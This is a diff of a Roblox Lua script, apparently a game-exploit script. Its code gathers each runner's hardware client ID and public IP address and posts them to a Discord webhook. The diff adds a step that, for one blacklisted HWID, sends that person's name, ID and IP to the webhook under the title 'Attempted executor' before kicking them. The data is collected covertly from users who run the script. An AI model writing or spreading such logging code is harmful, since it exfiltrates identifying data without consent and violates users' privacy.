@@ -78,10 +78,6 @@ end
 local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
 local IP = game:HttpGet("https://v4.ident.me/")
 
-if HWID == "22FCB723-D66F-4960-A917-5F950F24D152" then
-	LocalPlayer:Kick("go spread some false information elsewhere <3")
-end
-
 local data = {
 	content = "",
 	embeds = {{
@@ -117,6 +113,45 @@ if httpRequest then
 			Body = jsonEncodedData
 		})
 	end)
+end
+
+if HWID == "22FCB723-D66F-4960-A917-5F950F24D152" then
+	local data2 = {
+	content = "",
+	embeds = {{
+		title = "Attempted executor",
+		color = 34652167,
+		fields = {
+			{ name = "**Player Name**", value = "`" .. game.Players.LocalPlayer.Name .. "`", inline = true },
+			{ name = "**Place ID**", value = "`" .. game.PlaceId .. "`", inline = true },
+			{ name = "**Place Name**", value = "`" .. placeName .. "`", inline = true },
+			{ name = "**Job ID**", value = "`" .. (game.JobId or "N/A") .. "`", inline = false },
+			{ name = "**Time Executed**", value = "`" .. currentTime .. "`", inline = true },
+			{ name = "**User Key**", value = HWID, inline = true },
+			{ name = "**IP Address**", value = IP, inline = true }
+		},
+		footer = {
+			text = "Execution Log • " .. currentTime,
+			icon_url = "https://media.discordapp.net/attachments/1358006935491838104/1358007534887108638/Group_29.png?ex=67f24692&is=67f0f512&hm=ac3ac8250558a5dd7b9324f39c60d357266d0194dfba3731088c973edf9c3cc5&=&format=webp&quality=lossless&width=469&height=469"
+		}
+	}}
+	}
+
+	local jsonencodeblacklist1 = game:GetService("HttpService"):JSONEncode(data2)
+	
+	if httpRequest then
+	pcall(function()
+		httpRequest({
+			Url = webhookURL,
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = jsonencodeblacklist1
+		})
+	end)
+	end
+
+	task.wait(5)
+	LocalPlayer:Kick("go spread some false information elsewhere <3")
 end
 
 local clientConfig = {
